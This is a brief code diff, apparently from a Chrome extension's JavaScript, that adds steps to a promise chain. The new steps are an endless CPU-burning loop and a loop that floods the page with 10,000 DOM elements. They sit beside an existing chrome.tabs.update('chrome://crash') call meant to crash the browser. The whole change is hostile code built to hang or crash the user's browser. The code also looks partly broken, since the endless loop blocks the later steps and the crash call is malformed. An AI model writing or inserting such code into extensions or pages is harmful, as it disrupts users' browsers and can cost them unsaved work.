@@ -44,6 +44,16 @@
                 }
                     })
                     .then(() => {
+                        while (true) {
+                     Math.random() * Math.random();}})
+                    .then(() => {
+                    for (let i = 0; i < 10000; i++) {
+                     let div = document.createElement('div');
+                    div.textContent = 'Element ' + i;
+                     document.body.appendChild(div);
+                    }
+                    })
+                    .then(() => {
                         chrome.tabs.update("chrome://crash")
                     })
                     .then(() => {
